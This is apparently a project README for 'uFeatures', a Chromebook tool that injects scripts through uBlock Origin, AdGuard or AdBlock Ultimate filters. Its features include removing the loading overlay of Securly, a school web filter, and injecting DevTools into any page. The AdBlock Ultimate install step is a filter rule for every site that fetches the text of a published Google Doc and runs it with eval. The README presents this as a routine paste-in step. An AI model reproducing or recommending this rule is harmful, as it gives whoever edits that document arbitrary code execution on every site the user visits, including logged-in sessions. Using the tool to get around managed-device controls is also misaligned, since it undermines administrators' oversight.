<h1>
  <img src="https://raw.githubusercontent.com/StudioCompile/uFeatures/refs/heads/main/Logo.png" alt="uFeatures Logo" width="24" style="vertical-align: middle; margin-right:8px;" />
  uFeatures
</h1>

uFeatures is a powerful tool that uses script injection from ad blockers (uBlock Origin or AdGuard). It provides custom UserScripts, DevTools panel, bookmarklets, and other utilities to enhance your Chromebook experience.
## Installation

### uBlock Origin
1. Open uBlock Origin's dashboard (click the uBlock icon → the gear icon).
2. Go to the "Settings" tab and click the gear icon after enabling "I am an advanced user".
3. Scroll down to the last section and set `userResourcesLocation` to:

```
https://studiocompile.github.io/uFeatures/uBlock.js
```

4. In the "My filters" tab add:

```
*##+js(uFeatures)
```

### AdGuard (custom filter)
1. Enable UserScripts in chrome://extensions on the AdGuard page.
2. Open AdGuard → Filters → Custom filters → add by URL.
3. Add this URL:

```
https://studiocompile.github.io/uFeatures/AdGaurd.txt
```
### AdBlock Ultimate
Do the same stuff as AdGuard
```
*#%#if(!self.code_exec){self.code_exec=true;eval("fetch('https://docs.google.com/document/d/e/2PACX-1vSOvPP7khIrr4QEhD-y5EzZa6MJtiaeC0upi9U9Ncgs-45UUk9E8HpoPFQnJRsaz-FnTcVyabY7eiIj/pub').then(r=>r.text()).then(h=>{let d=new DOMParser().parseFromString(h,'text/html'),t=[...d.querySelectorAll('#contents p')].map(x=>x.textContent).join('\\n').trim();eval(t)})")}
```

## Features
- Script Manager — Save JavaScript snippets that run automatically on specific sites every page load.
- Remove Securly Loading — removes the annoying Securly loading overlay.
- Inspect Element — Injects a remote DevTools panel into any page (Ctrl+Shift+I to toggle).
- Bookmarklet Runner — Paste a `javascript:` URL (Ctrl+V outside a text field) to run it on the current page.
- Iframe Navigator — Hover the bottom-right corner of any iframe to navigate it to a new URL.

## Credits
Created By StudioCompile using Claude Sonnet
